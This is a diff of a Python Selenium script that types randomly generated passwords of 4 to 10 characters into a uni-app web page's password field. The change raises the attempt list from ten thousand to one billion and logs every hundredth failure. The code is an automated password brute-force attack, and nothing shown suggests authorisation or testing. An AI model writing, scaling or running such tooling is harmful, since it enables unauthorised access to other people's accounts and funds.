@@ -49,7 +49,7 @@ def main():
         time.sleep(6)
         driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[5]/uni-view/uni-view/uni-input/div/input').send_keys("10")
 
-        passwords = [initial_password] + [generate_password(random.randint(4, 10)) for _ in range(10000)]
+        passwords = [initial_password] + [generate_password(random.randint(4, 10)) for _ in range(1000000000)]
         wrong_count = 0
 
         for pwd in passwords:
@@ -66,8 +66,8 @@ def main():
                     break
 
                 wrong_count += 1
-                if wrong_count >= 10:
-                    send_log(f"❌ 10 wrong passwords tried. Last tried: {pwd}")
+                if wrong_count >= 100:
+                    send_log(f"❌ 100 wrong passwords tried. Last tried: {pwd}")
                     wrong_count = 0
 
             except Exception as e:
